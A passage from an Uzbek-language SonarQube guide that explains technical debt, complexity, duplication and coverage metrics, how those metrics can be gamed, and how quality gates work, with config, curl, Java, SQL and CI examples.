| E | kamida bitta blocker darajali issue bor | 50% dan ko'p | 30% dan kam |

Jadvaldagi chegaralar SonarQube ning standart sozlamasi, va ularni administrator o'zgartirishi mumkin. Og'irlik atamasi versiyaga qarab farq qiladi: eski liniyada bu Blocker, Critical, Major, Minor, Info severity, 10.x dan boshlangan Clean Code taksonomiyasida esa har bir issue software quality (reliability, security, maintainability) va impact darajasi orqali tavsiflanadi. Mexanika o'zgarmadi: eng og'ir ta'sir harfni belgilaydi.

### 5.2 Texnik qarz (technical debt) va debt ratio: formulasi va ma'nosi

Texnik qarz Sonar da aniq o'lchov birligiga ega: daqiqa. Bu SQALE index deb ataladi va barcha maintainability issue larning remediation effort yig'indisiga teng. Hisobotda u "5d 4h" ko'rinishida chiqadi, lekin ichida baribir butun son daqiqa yotadi. Kun hisobiga o'tkazishda standart ish kuni 8 soat deb olinadi, shuning uchun 480 daqiqa qarz "1d" bo'lib ko'rinadi.

Debt ratio esa nisbat: qarzni shu kodni noldan yozish uchun ketadigan taxminiy vaqtga bo'ladi. Rivojlantirish narxi standart holatda har bir kod qatori uchun 30 daqiqa deb olinadi, bu `sonar.technicalDebt.developmentCost` sozlamasi bilan boshqariladi. Formula: debt ratio = remediation cost / (ncloc * cost per line). 10 000 qatorli modulda rivojlantirish narxi 300 000 daqiqa, ya'ni A reyting uchun qarz 15 000 daqiqadan oshmasligi kerak.

Bu formuladan bitta nozik xulosa chiqadi: debt ratio ni kod yozib ham yaxshilash mumkin. Agar modulga toza 5000 qator qo'shsangiz, maxraj o'sadi va foiz tushadi, qarzning o'zi esa joyida qoladi. Shuning uchun absolyut qarz daqiqasi va foiz birga o'qilishi kerak.

```properties
# sonar-project.properties: qarz hisobini loyihaga moslash
sonar.projectKey=payments-service
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.java.binaries=target/classes

# Bitta kod qatorini yozish narxi daqiqada.
# Standart 30. Pasaytirsang debt ratio oshadi, ya'ni talab qattiqlashadi.
sonar.technicalDebt.developmentCost=30

# Generatsiya qilingan kod qarzga kirmasligi uchun chiqarib tashlanadi.
sonar.exclusions=**/generated/**,**/*MapperImpl.java,**/dto/openapi/**

# Coverage hisobidan test yordamchilarini chiqarish.
sonar.coverage.exclusions=**/config/**,**/*Application.java
```

Yangi kod uchun alohida qarz o'lchovi bor, va amalda aynan shu muhim. Quality gate da ko'pincha "new code maintainability rating A dan past bo'lmasin" sharti turadi, bu esa yangi kod qarz nisbati 5% dan oshmasin degani. Eski qarz esa gate ni buzmaydi, u faqat hisobotda yashab turadi.

### 5.3 Remediation effort: har bir issue ga qo'yilgan vaqt bahosi qayerdan keladi

Vaqt bahosi kodni tahlil qilishdan emas, qoidaning ta'rifidan keladi. Har bir rule o'zining remediation funksiyasiga ega va u uch shakldan biri bo'ladi. Constant: qoida ishga tushgan har bir joy uchun bir xil vaqt, masalan 5 daqiqa. Linear: o'lchangan birlik soniga ko'paytiriladi, masalan har bir takrorlangan blok uchun 10 daqiqa. Linear with offset: boshlang'ich vaqt plus birlik bahosi, masalan 30 daqiqa plus ortiqcha har bir shoxlanish uchun 1 daqiqa.

Shuning uchun cognitive complexity 40 bo'lgan metod cognitive complexity 16 bo'lgan metoddan ko'proq qarz keltiradi, chunki offset ustiga ortiqcha birliklar qo'shiladi. Va shuning uchun bitta katta God class o'nta kichik smell dan ko'proq daqiqa bera oladi.

Bu bahalarni administrator Quality Profile da o'zgartirishi mumkin, lekin buni kamdan kam qilish kerak. Agar siz bahani pasaytirib debt ratio ni A ga chiqarsangiz, siz muammoni tuzatmadingiz, faqat o'lchov asbobini sozladingiz. To'g'ri yo'l: loyihaga mos kelmaydigan qoidani profildan butunlay o'chirish va buni yozib qo'yish, bahani qalbakilashtirmaslik.

```bash
# Qarzni qaysi fayl va qaysi qoida keltirganini aniqlash.
# facets effort bo'yicha jamlanmani qaytaradi.
curl -s -u "$SONAR_TOKEN:" \
  "$SONAR_URL/api/issues/search?componentKeys=payments-service\
&impactSoftwareQualities=MAINTAINABILITY&ps=1&facets=rules,files" \
  | jq '.facets[] | {property, values: (.values[0:5])}'

# Eng qimmat 10 ta issue: effort bo'yicha saralash.
curl -s -u "$SONAR_TOKEN:" \
  "$SONAR_URL/api/issues/search?componentKeys=payments-service\
&s=EFFORT&asc=false&ps=10" \
  | jq -r '.issues[] | "\(.effort)\t\(.rule)\t\(.component):\(.line)"'
```

Ikkinchi so'rov amalda eng foydali: u 1000 ta mayda smell o'rniga qarzning yarmini keltirgan uchta metodni ko'rsatadi. Qarz kamaytirishni shu uchtadan boshlash kerak.

### 5.4 Cyclomatic complexity va cognitive complexity farqi

Cyclomatic complexity mustaqil ijro yo'llari sonini sanaydi. Har bir shoxlanish nuqtasi bittaga oshiradi: `if`, `for`, `while`, `do`, `case`, `catch`, shuningdek `&&` va `||` qisqa tutashuv operatorlari va uchlik operator. `else` qo'shmaydi, chunki u yangi shart kiritmaydi. Bu metrika test uchun qulay: u taxminan nechta test holati kerakligini ko'rsatadi.

Cognitive complexity esa kodni odam o'qiganda qancha kuch ketishini modellashtiradi va bu `java:S3776` qoidasining asosi. Uning uchta farqi muhim. Birinchi: ichma ich joylashuv jarima oladi, ikkinchi qavat ichidagi `if` bittaga emas, uchga oshiradi. Ikkinchi: butun `switch` bloki nechta `case` borligidan qat'i nazar bittaga oshiradi, chunki o'qishga bitta qaror sifatida tushadi. Uchinchi: bir xil mantiqiy operatorlar ketma ketligi bitta deb sanaladi, ya'ni `a && b && c` bitta, `a && b || c` esa ikkita.

Natijada bir xil cyclomatic qiymatiga ega ikki metod butunlay boshqa cognitive qiymat olishi mumkin. Bu bejiz emas: tekis `switch` o'qishga oson, uch qavatli `if` esa qiyin. Standart chegara 15, u sozlanadi.

```java
// Sonar shikoyati: java:S3776, cognitive complexity 15 chegarasidan oshdi.
// Sabab: uch qavat ichma ich shart, har bir qavat jarima qo'shadi.
BigDecimal hisobla(Buyurtma b) {
    BigDecimal jami = BigDecimal.ZERO;
    if (b != null) {                                   // +1
        if (b.getQatorlar() != null) {                 // +2 (joylashuv)
            for (Qator q : b.getQatorlar()) {          // +3
                if (q.getSoni() > 0) {                 // +4
                    if (q.getChegirma() != null) {     // +5
                        jami = jami.add(q.narxChegirmali());
                    } else {                           // +1
                        jami = jami.add(q.narx());
                    }
                }
            }
        }
    }
    return jami;
}
```

```java
// Sonar o'tadigan variant: guard clause va stream bilan qavat yo'qoldi.
// Cognitive complexity 1 ga tushdi, cyclomatic ham pasaydi.
BigDecimal hisobla(Buyurtma b) {
    if (b == null || b.getQatorlar() == null) {   // +1, ketma ket || bitta sanaladi
        return BigDecimal.ZERO;
    }
    return b.getQatorlar().stream()
            .filter(q -> q.getSoni() > 0)
            .map(Qator::narxYakuniy)              // chegirma mantiqi Qator ichida
            .reduce(BigDecimal.ZERO, BigDecimal::add);
}
```

Ikkinchi variantda chegirma shartini `Qator` ga ko'chirish tasodifiy emas. Murakkablikni kamaytirishning ishonchli yo'li uni bo'lish emas, balki qarorni ma'lumot egasiga berish. Shunchaki metodni ikkiga bo'lsangiz, umumiy cognitive yig'indisi saqlanib qolishi mumkin, faqat chegaradan o'tib ketadi.

### 5.5 Takrorlanish (duplication): blok qanday aniqlanadi va foiz qanday hisoblanadi

Sonar takrorlanishni o'zining CPD (copy paste detector) mexanizmi bilan topadi va Java uchun chegara ketma ket 10 ta bayonot (statement). Ya'ni o'ntadan kam qatorli bir xil nusxa hisobga olinmaydi. Taqqoslash tokenlar darajasida ketadi, shuning uchun o'zgaruvchi nomini almashtirish takrorlanishni yashirmaydi, formatlash va izohlar esa ahamiyatsiz.

Foiz juda sodda: duplicated_lines_density = duplicated_lines / lines * 100. Diqqat qiling, maxrajda `lines`, ya'ni fayldagi barcha qatorlar, `ncloc` emas. Va takrorlangan blokning har ikki nusxasi ham duplicated_lines ga kiradi, shuning uchun 50 qatorli blokni bir joyga ko'chirish foizni 100 qatorga kamaytiradi. Standart quality gate sharti: yangi kodda takrorlanish 3% dan oshmasin.

Eng ko'p tortishuv test kodi va DTO ustida boshlanadi. Testlarda o'xshash arrange bloklari tabiiy, generatsiya qilingan DTO larda esa takrorlanish ma'nosiz. To'g'ri javob ikkisi uchun boshqa: testdagi takrorlanishni odatda builder yoki object mother bilan yo'qotish kerak (bu mavzu testlash qo'llanmasidagi test ma'lumotlari bo'limida ochilgan), generatsiya qilingan kodni esa tahlildan chiqarish kerak.

```properties
# Takrorlanish hisobini halol saqlash.
# Generatsiya qilingan kod CPD dan chiqariladi, chunki uni tuzatish mumkin emas.
sonar.cpd.exclusions=**/generated/**,**/*Request.java,**/*Response.java

# DIQQAT: testlarni bu yerga qo'shish vasvasa, lekin bu qarzni yashiradi.
# Testdagi takrorlanishni object mother bilan yo'qotish afzal.
# sonar.cpd.exclusions=**/test/** <- buni qilmaslik tavsiya etiladi

# Java uchun blok chegarasi tilga qattiq bog'langan: 10 bayonot.
# Uni property bilan o'zgartirib bo'lmaydi, faqat istisno qo'shish mumkin.
```

### 5.6 Hajm metrikalari: qatorlar, bayonotlar, funksiyalar, klasslar

Hajm metrikalari o'zi bo'yicha sifat haqida gapirmaydi, lekin ular boshqa hamma formulaning maxraji bo'lgani uchun muhim. `lines` fayldagi jismoniy qatorlar, bo'sh qatorlar ham kiradi. `ncloc` esa izoh va bo'sh qatorsiz kod qatorlari, va aynan u debt ratio hisobida ishlatiladi. Ikkisi orasidagi farq odatda 25 dan 40 foizga yetadi.

`statements` bayonotlar sonini sanaydi va u qatorlardan mustaqil, chunki bitta qatorga uchta bayonot sig'adi. `functions` metodlar va konstruktorlar soni, `classes` esa klass, interface, enum va record larni birga oladi. `comment_lines_density` izohlar ulushini ko'rsatadi, lekin bu metrikani maqsadga aylantirish deyarli har doim zarar: natijada har bir getter ustida ma'nosiz Javadoc paydo bo'ladi.

Amalda hajm metrikalaridan eng foydali ikkita nisbat chiqadi. Birinchi: ncloc bo'lingan functions, ya'ni o'rtacha metod uzunligi. Ikkinchi: functions bo'lingan classes, ya'ni o'rtacha klass to'ldirilganligi. Ikkinchisi keskin o'sgan paytda modulda God class o'sayotgan bo'ladi.

```bash
# Modul kesimida hajm va murakkablik nisbatlarini chiqarish.
curl -s -u "$SONAR_TOKEN:" \
  "$SONAR_URL/api/measures/component_tree?component=payments-service\
&metricKeys=ncloc,statements,functions,classes,complexity,cognitive_complexity\
&qualifiers=DIR&ps=100" \
  | jq -r '.components[] |
      [ .path,
        (.measures[] | select(.metric=="ncloc") | .value),
        (.measures[] | select(.metric=="functions") | .value),
        (.measures[] | select(.metric=="cognitive_complexity") | .value)
      ] | @tsv' \
  | awk -F'\t' '{printf "%-40s ncloc=%s fn=%s cog=%s avg_cog=%.1f\n", \
      $1,$2,$3,$4,($3>0?$4/$3:0)}' \
  | sort -t= -k5 -nr | head -15
```

### 5.7 Qamrov metrikalari: line, branch va umumiy coverage

Uchta raqam bor va ular turlicha hisoblanadi. Line coverage bajarilishi mumkin bo'lgan qatorlarning qanchasi hech bo'lmasa bir marta ishga tushganini ko'rsatadi. Branch coverage (Sonar da condition coverage) har bir shartning ham true, ham false yo'li sinalganini talab qiladi, shuning uchun u deyarli har doim pastroq chiqadi. Umumiy `coverage` metrikasi esa ikkisining qo'shilgan nisbati: qoplangan shartlar plus qoplangan qatorlar bo'lingan barcha shartlar plus barcha bajariladigan qatorlar.

Shu formuladan muhim narsa kelib chiqadi: shoxlanishlar maxrajga ikki marta kiradi, chunki har bir shart ikkita yo'l beradi. Shuning uchun murakkab metodni test qilmaslik umumiy coverage ni oddiy metodni test qilmaslikdan ko'ra qattiqroq tushiradi. Bu ham tasodifiy emas, bu metrikaga ataylab kiritilgan og'irlik.

Sonar o'zi coverage o'lchamaydi. Uni JaCoCo 0.8.x o'lchaydi va XML hisobotini beradi, Sonar esa faqat o'qiydi. Shuning uchun eng keng tarqalgan nosozlik tahlil xatosi emas, hisobot yo'lining noto'g'ri ko'rsatilishi yoki hisobot Sonar ishga tushgandan keyin yaratilishi.

```xml
<!-- JaCoCo: XML hisobot Sonar uchun majburiy, HTML faqat odam uchun -->
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution>
      <id>prepare-agent</id>
      <goals><goal>prepare-agent</goal></goals>
    </execution>
    <execution>
      <!-- report verify dan oldin bo'lsin, aks holda Sonar bo'sh fayl ko'radi -->
      <id>report</id>
      <phase>test</phase>
      <goals><goal>report</goal></goals>
    </execution>
  </executions>
</plugin>
```

```yaml
# CI: tartib muhim. test -> jacoco report -> sonar.
# sonar ni alohida ishga tushirsang, target/ tozalanib ketmasligi kerak.
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }   # new code farqi uchun butun tarix kerak
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '21' }
      - name: Test va coverage
        run: mvn -B verify
      - name: Sonar tahlili
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        run: >
          mvn -B sonar:sonar
          -Dsonar.host.url=${{ vars.SONAR_URL }}
          -Dsonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
      - name: Quality gate natijasini kutish
        run: mvn -B sonar:sonar -Dsonar.qualitygate.wait=true
```

### 5.8 Metrikalarning cheklovi: raqam yaxshi, kod yomon bo'lishi mumkin

Har bir metrikani aldash mumkin, va ko'pincha bu ataylab emas, bilmaslikdan sodir bo'ladi. Coverage assert siz test bilan ko'tariladi, chunki JaCoCo qator bajarildimi degan savolga javob beradi, natija to'g'rimi degan savolga emas. Cognitive complexity metodni ikkiga bo'lib pasayadi, holbuki umumiy mantiq xuddi shunday chalkash qoladi. Duplication foizi maxrajni kattalashtirib tushadi. Debt ratio yangi kod qo'shib yaxshilanadi.

| Tuzoq | Nima bo'ladi | Yechim |
|---|---|---|
| Assert siz test | coverage 90%, xato ushlanmaydi | mutation testing yoki kod review da assert talab qilish |
| Katta metodni mexanik bo'lish | S3776 yo'qoladi, chalkashlik qoladi | qarorni ma'lumot egasi klassga ko'chirish |
| `sonar.cpd.exclusions` ga testni qo'shish | duplication 0%, test bazasi chirkin | object mother va builder joriy qilish |
| Getter ustiga Javadoc | comment density o'sadi, foyda yo'q | izohni faqat sabab tushuntirishga ishlatish |
| Debt ratio ni yangi kod bilan suyultirish | foiz A, qarz daqiqasi o'sgan | absolyut `sqale_index` ni ham kuzatish |
| `@SuppressWarnings` va NOSONAR tarqalishi | issue yo'q, muammo bor | NOSONAR ni gate da sanash, sababini talab qilish |
| 100% coverage ni maqsad qilish | trivial test lavinasi | yangi kod uchun 80% chegara, murakkab joyga branch talab |
| Integration test ni coverage dan chiqarish | past foiz, haqiqiy qamrov ko'rinmaydi | hisobotlarni birlashtirib bitta XML bermoq |

Asosiy xulosa: metrika kodni emas, kodning kuzatiladigan shaklini o'lchaydi. Shakl to'g'ri bo'lib, mazmun buzuq bo'lishi mumkin. Shuning uchun Sonar kod review ni almashtirmaydi, u review qilinadigan joyni ko'rsatadi.

### 5.9 Qaysi metrikaga ishonish mumkin, qaysi biri faqat signal

Metrikalarni ikki toifaga ajratish kerak: qaror qabul qilish mumkin bo'lganlar va tekshirishga chaqiradiganlar. Birinchi toifada aniq, bir ma'noli o'lchovlar: yangi kodda bug yoki vulnerability bormi, yangi kod coverage foizi, takrorlangan yangi bloklar. Ikkinchi toifada jamlanma va baholovchi raqamlar: umumiy debt daqiqasi, maintainability harfi, umumiy coverage, comment density.

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Asosiy ko'rsatkich | umumiy coverage foizini kuzatadi | new code coverage va new code bug ni kuzatadi |
| Reyting harfi | A ni maqsad qilib qo'yadi | harf ortidagi eng qimmat 10 issue ni ochadi |
| Debt | daqiqa yig'indisini hisobotda qoldiradi | qarzni modul kesimiga bo'lib egasini belgilaydi |
| Murakkablik | chegaradan o'tish uchun metodni bo'ladi | mas'uliyatni klasslar orasida qayta taqsimlaydi |
| Duplication | exclusions bilan foizni tushiradi | takrorlangan blokni umumiy abstraksiyaga chiqaradi |
| Coverage chegarasi | butun loyihaga 80% qo'yadi | murakkab paketga branch coverage shartini qo'shadi |
| NOSONAR | kerak bo'lsa yozadi, izohsiz | sababli izoh talab qiladi va sonini trend qiladi |
| Gate buzilishi | kechiktiradi, keyin ko'radi | PR ni bloklaydi va shu kuni tuzatadi |
| Metrika manbasi | UI dagi raqamga qaraydi | API dan tarix yig'ib trend o'qiydi |
| Istisno | global exclusions yozadi | istisnoni sabab bilan hujjatlashtiradi va muddat qo'yadi |

Qoida sifatida: qaror metrikalarini quality gate ga qo'ying, signal metrikalarini esa faqat kuzatuvda qoldiring. Signal metrikasini gate ga qo'yish eng tez yo'l bilan uni aldashga olib keladi, chunki jamoada shu raqamni ko'tarish rag'bati paydo bo'ladi.

### 5.10 Metrikani vaqt bo'ylab kuzatish va trend o'qish

Bitta tahlil natijasi deyarli hech narsa aytmaydi. Ma'no yo'nalishda: qarz o'sayotganmi yoki kamayayotganmi, coverage qaysi sprintdan keyin tushdi, murakkablik qaysi modulda to'planmoqda. Sonar bu uchun `api/measures/search_history` endpointini beradi, va uni haftada bir marta o'z bazangizga yozib qo'yish eng arzon kuzatuv usuli.

Trendni o'qishda uchta naqshni ajratish kerak. Birinchi: coverage ning pog'onali tushishi, bu odatda yangi modul test siz qo'shilganini bildiradi. Ikkinchi: qarzning tekis o'sishi, bu normal, agar ratio barqaror bo'lsa. Uchinchi: issue sonining keskin o'zgarishi quality profile almashganini bildiradi, kod o'zgarganini emas, va bu ikkisini aralashtirmaslik muhim.

```sql
-- O'z bazangizda saqlangan trend jadvali (API dan haftada bir yozib boriladi).
-- Maqsad: foiz va absolyut qarzni birga ko'rish.
SELECT
    o_sana,
    ncloc,
    sqale_index                                   AS qarz_daqiqa,
    ROUND(sqale_debt_ratio, 2)                    AS qarz_foiz,
    ROUND(coverage, 1)                            AS qamrov,
    sqale_index - LAG(sqale_index) OVER (ORDER BY o_sana) AS qarz_ozgarish,
    ROUND(coverage - LAG(coverage) OVER (ORDER BY o_sana), 1) AS qamrov_ozgarish
FROM sifat_trend
WHERE loyiha_kaliti = 'payments-service'
  AND o_sana >= CURRENT_DATE - INTERVAL '180 days'
ORDER BY o_sana DESC;
```

Bu so'rovda `qarz_ozgarish` musbat, `qarz_foiz` esa tushgan hafta eng xavfli holat: kod ko'p yozilgan, qarz ham o'sgan, lekin foiz suyulgani uchun hech kim sezmagan. Aynan shu holatni trend ko'rsatadi, bitta hisobot esa yashiradi.

Oxirgi maslahat: trendni odamga ko'rsatganda foizni emas, yo'nalishni ko'rsating. "Qarz uch sprintda 12 kundan 19 kunga o'sdi" gapi "maintainability C" gapidan ko'ra ko'proq qaror keltiradi, chunki unda vaqt va miqdor bor.

### 5.11 Amalda qo'llash

- [ ] Loyihangizda `sqale_index` (daqiqa) va `sqale_debt_ratio` (foiz) qiymatlarini birga chiqarib, oxirgi uch oyda ikkisi bir yo'nalishda harakat qilganini tekshiring.
- [ ] `api/issues/search` ni `s=EFFORT&asc=false` bilan chaqirib, qarzning eng qimmat 10 ta manbasini aniqlang va ularni mas'ul jamoalarga taqsimlang.
- [ ] Cognitive complexity bo'yicha chegaradan o'tgan uchta metodni tanlab, ularni bo'lish emas, mas'uliyatni ko'chirish bilan qayta yozing va oldingi hamda keyingi qiymatni yozib qo'ying.
- [ ] `sonar.cpd.exclusions` va `sonar.coverage.exclusions` ro'yxatini ochib, har bir qator uchun sababni izohda yozing, sababsizlarini olib tashlang.
- [ ] JaCoCo XML hisoboti Sonar tahlilidan oldin yaratilayotganini CI logidan tasdiqlang, `xmlReportPaths` yo'li mavjud faylga ko'rsatayotganini tekshiring.
- [ ] Quality gate ni ko'rib chiqing: unda faqat new code bo'yicha qaror metrikalari turganiga, umumiy coverage kabi signal metrikalari turmaganiga ishonch hosil qiling.
- [ ] Kod bazasida `NOSONAR` va `@SuppressWarnings("java:S...")` sonini sanab, trend jadvaliga ustun qilib qo'shing va har bir yangisiga sabab izohini talab qiling.
- [ ] Haftalik cron bilan `api/measures/search_history` natijasini o'z jadvalingizga yozib boradigan skript qo'shing, keyin 6 oylik trendni jamoaga ko'rsating.


# II. Quality gate

## 6. Quality gate mexanikasi va shartlari (Quality Gate Mechanics)

Quality gate Sonar tahlilining yakuniy hukmi. Analiz minglab issue va o'nlab metrikani hisoblaydi, lekin CI ga faqat bitta javob kerak: o'tdi yoki o'tmadi. Quality gate aynan shu javobni beradigan mexanizm, va u sehrli emas: bir nechta oddiy shartning mantiqiy VA (AND) birlashmasi. Shu bobda shart qanday tuzilishini, holat qachon hisoblanishini, CI uni qanday kutib olishini va qattiq sozlangan gate jamoani qanday buzishini ko'ramiz.

### 6.1 Quality gate nima: shartlar to'plami va ularning tekshirilishi

Quality gate nomlangan shartlar ro'yxati. Har bir shart bitta metrikaga tegishli. Shart "coverage 80% dan kam bo'lsa failed" yoki "yangi duplikatsiya 3% dan ko'p bo'lsa failed" ko'rinishida yoziladi. Gate holati barcha shartlarning birlashmasi: hech bo'lmasa bitta shart buzilsa, gate failed bo'ladi. Shartlar orasida OR yo'q, ularni "yoki" bilan birlashtirib bo'lmaydi.

Muhim nuqta: gate shartni o'zi hisoblamaydi. Metrikani scanner va server tomoni hisoblaydi, gate esa tayyor raqamni chegara bilan solishtiradi. Shuning uchun gate natijasi analiz tugab, Compute Engine vazifasi `SUCCESS` bo'lgandan keyingina mavjud bo'ladi. Scanner tugashi gate tugashini bildirmaydi.

Shartlar odatda "New Code" (yangi kod) va "Overall Code" (butun kod) ko'rinishida ikkiga bo'linadi. Zamonaviy sozlamada deyarli barcha bloklovchi shart New Code ustida turadi. Buning sababi oddiy: eski texnik qarzni bir kechada to'lash mumkin emas, lekin yangi kod sifatini bugundan nazorat qilish mumkin.

### 6.2 Standart gate va uning shartlari

SonarQube o'rnatilganda `Sonar way` nomli gate built-in bo'lib keladi va yangi loyihalarga standart sifatida tayinlanadi. Uni tahrirlab bo'lmaydi, chunki u built-in. O'zgartirish kerak bo'lsa, nusxa olinadi va nusxa tahrirlanadi.

`Sonar way` tarkibi SonarQube liniyasiga qarab farq qiladi, buni e'tiborsiz qoldirmang. 9.9 LTA davrida u asosan reyting va foiz shartlaridan iborat edi: New Code uchun coverage kamida 80%, duplikatsiya 3% dan oshmasin, Reliability, Security va Maintainability reytingi A bo'lsin, Security Hotspots 100% ko'rib chiqilgan bo'lsin. Clean Code taksonomiyasi kirgandan keyin, 10.x va 2025 LTA liniyasida reyting shartlari o'rnini "yangi issue bo'lmasin" turidagi to'g'ridan to'g'ri shart egalladi. Aniq ro'yxatni har doim o'z serveringizdagi Quality Gates sahifasidan tekshirib oling, yodda saqlangan ro'yxatga ishonmang.

Amalda eng ko'p adashtiradigan shart coverage. 80% raqami butun loyiha uchun emas, New Code uchun qo'yiladi. Agar PR da 10 qator yangi kod bo'lsa va ulardan 2 qator test bilan qoplanmagan bo'lsa, New Code coverage 80% chiqadi va shart arang o'tadi. Yana bitta qoplanmagan qator PR ni failed qiladi. Kichik PR da coverage juda sezgir bo'ladi, bu normal hol.

### 6.3 Shart tuzilishi: metrika, operator, chegara qiymati

Har bir shart uchta elementdan yig'iladi. Birinchisi metrika kaliti, masalan `new_coverage` yoki `new_duplicated_lines_density`. Ikkinchisi operator: kichik, katta yoki teng emas. Uchinchisi chegara (threshold), ya'ni raqam yoki reyting darajasi.

Metrikaning yo'nalishi operatorni belgilaydi. Coverage uchun "yaxshi" yo'nalish yuqoriga, shuning uchun shart "chegaradan kichik bo'lsa failed" shaklida yoziladi. Duplikatsiya uchun yo'nalish pastga, shuning uchun shart "chegaradan katta bo'lsa failed" bo'ladi. UI da operator ko'pincha avtomatik tanlanadi, API orqali yozganda esa qo'lda beriladi.

```bash
# Gate shartlarini API orqali ko'rish va yangi shart qo'shish.
# Token bilan autentifikatsiya, parol bo'sh qoldiriladi.
export SONAR_HOST=https://sonar.company.uz
export SONAR_TOKEN=squ_xxxxxxxx

# 1) Mavjud gate va uning shartlari ro'yxati
curl -s -u "$SONAR_TOKEN:" \
  "$SONAR_HOST/api/qualitygates/show?name=Payment%20Gate" | jq '.conditions'

# 2) Yangi shart: New Code coverage 85% dan kam bo'lsa failed
curl -s -u "$SONAR_TOKEN:" -X POST \
  "$SONAR_HOST/api/qualitygates/create_condition" \
  -d "gateName=Payment Gate" \
  -d "metric=new_coverage" \
  -d "op=LT" \
  -d "error=85"

# 3) Shartni o'chirish uchun avval uning id sini olish kerak
# (show javobidagi conditions[].id qiymati ishlatiladi)
```

Reyting metrikalari raqam bilan kodlanadi: A uchun 1, B uchun 2 va shu tartibda. API ga `error=1` yuborilsa, bu "A dan yomon bo'lsa failed" degani. UI da buni harf ko'rinishida ko'rasiz, API da raqam sifatida. Shu nomuvofiqlik ko'p chalkashtiradi.

| Metrika turi | Yo'nalish | Odatiy operator | Chegara ko'rinishi |
|---|---|---|---|
| Coverage, condition coverage | Yuqoriga yaxshi | LT (kichik bo'lsa failed) | Foiz, masalan 80 |
| Duplikatsiya foizi | Pastga yaxshi | GT (katta bo'lsa failed) | Foiz, masalan 3 |
| Issue soni | Pastga yaxshi | GT | Butun son, masalan 0 |
| Reyting (A..E) | A eng yaxshi | GT | Raqam kodi, A uchun 1 |
| Security Hotspots Reviewed | Yuqoriga yaxshi | LT | Foiz, odatda 100 |

### 6.4 Gate holati: passed va failed, va u qachon hisoblanadi

Gate holati uch qiymatdan biri bo'ladi: `OK`, `ERROR` yoki `NONE`. `NONE` holati gate da hech qanday shart yo'qligini bildiradi, bu sozlash xatosi. Ko'pchilik UI da `Passed` va `Failed` so'zlarini ko'radi, API esa `OK` va `ERROR` qaytaradi. Skriptlarda API qiymatiga tayanish kerak.

Hisoblash ketma-ketligi quyidagicha. Scanner kodni analiz qiladi va natijani serverga yuboradi. Server navbatga Compute Engine vazifasini qo'yadi. Vazifa bajarilganda metrikalar saqlanadi va shundan keyin gate hisoblanadi. Ya'ni gate asinxron, scanner tugaganda hali javob yo'q.

```java
// Gate natijasini analizdan keyin olish uchun minimal klient.
// Bu kod CI yordamchi utilitasida ishlatiladi, ilova kodida emas.
public final class QualityGateClient {
    private static final HttpClient HTTP = HttpClient.newHttpClient();
    private final String baseUrl;
    private final String authHeader;

    public QualityGateClient(String baseUrl, String token) {
        this.baseUrl = Objects.requireNonNull(baseUrl, "baseUrl");
        // Token parol o'rnida keladi, parol qismi bo'sh qoldiriladi
        this.authHeader = "Basic " + Base64.getEncoder()
                .encodeToString((token + ":").getBytes(StandardCharsets.UTF_8));
    }

    /** Loyiha oxirgi analizi bo'yicha gate holati: OK yoki ERROR. */
    public String fetchStatus(String projectKey) throws IOException, InterruptedException {
        String url = baseUrl + "/api/qualitygates/project_status?projectKey="
                + URLEncoder.encode(projectKey, StandardCharsets.UTF_8);
        HttpRequest request = HttpRequest.newBuilder(URI.create(url))
                .header("Authorization", authHeader).GET().build();
        HttpResponse<String> response = HTTP.send(request, BodyHandlers.ofString());
        if (response.statusCode() != 200) {
            throw new IOException("Sonar API xatosi: " + response.statusCode());
        }
        return JsonPath.read(response.body(), "$.projectStatus.status");
    }
}
```

Bu klientni yozishdan oldin bitta savol bering: menga haqiqatan kerakmi. Ko'pincha kerak emas, chunki plugin buni o'zi qila oladi. Klient faqat natijani o'z dashboardingizga yozmoqchi bo'lsangiz asos bo'ladi.

### 6.5 Gate ni loyihaga tayinlash va bir nechta gate ni boshqarish

Har bir loyihada aynan bitta quality gate bo'ladi. Ikki gate ni bir loyihaga biriktirib bo'lmaydi. Agar ikki xil talab kerak bo'lsa, ikki gate ni birlashtirgan uchinchi gate yasaladi yoki loyiha ikkiga bo'linadi.

Tayinlash UI da loyiha sozlamalaridan yoki API orqali qilinadi. Yangi loyihalar standart deb belgilangan gate ni oladi. Katta tashkilotda eng barqaror yondashuv quyidagicha: 2 yoki 3 ta gate, har biri ma'lum sinfdagi servis uchun. Masalan to'lov va auth servislari uchun qattiqroq gate, ichki admin paneli uchun yumshoqroq gate, legacy monolit uchun faqat "yangi issue qo'shilmasin" turidagi minimal gate.

```bash
# Gate ni loyihaga tayinlash va standart gate ni o'rnatish.
# Ko'p loyihaga bir xil gate ni biriktirish uchun oddiy tsikl yetarli.

for KEY in uz.company:payment-api uz.company:billing-worker; do
  curl -s -u "$SONAR_TOKEN:" -X POST \
    "$SONAR_HOST/api/qualitygates/select" \
    -d "gateName=Critical Services Gate" \
    -d "projectKey=$KEY"
  echo "tayinlandi: $KEY"
done

# Yangi loyihalar uchun standart gate (ehtiyot bo'ling, global ta'sir qiladi)
curl -s -u "$SONAR_TOKEN:" -X POST \
  "$SONAR_HOST/api/qualitygates/set_as_default" \
  -d "name=Default Service Gate"
```

Gate sonini ko'paytirmang. Har bir qo'shimcha gate alohida kelishuv, alohida tarix va alohida tushunmovchilik manbasi. O'n beshta gate bo'lgan serverda hech kim qaysi loyihada qanday talab borligini bilmaydi.

### 6.6 Gate natijasini CI da olish: `sonar.qualitygate.wait` va uning ta'siri

Standart holatda scanner natijani yuboradi va darhol muvaffaqiyat bilan tugaydi. Gate failed bo'lsa ham build yashil qoladi. Bu eng ko'p uchraydigan yolg'on xavfsizlik hissi: pipeline da Sonar bosqichi bor, lekin u hech narsani bloklamaydi.

Buni `sonar.qualitygate.wait=true` parametri hal qiladi. U yoqilganda scanner Compute Engine vazifasi tugashini kutadi, gate holatini oladi va `ERROR` bo'lsa nolga teng bo'lmagan exit kod bilan tugaydi. Kutish vaqti `sonar.qualitygate.timeout` bilan boshqariladi va soniyada beriladi, standart qiymati 300 soniya atrofida.

```properties
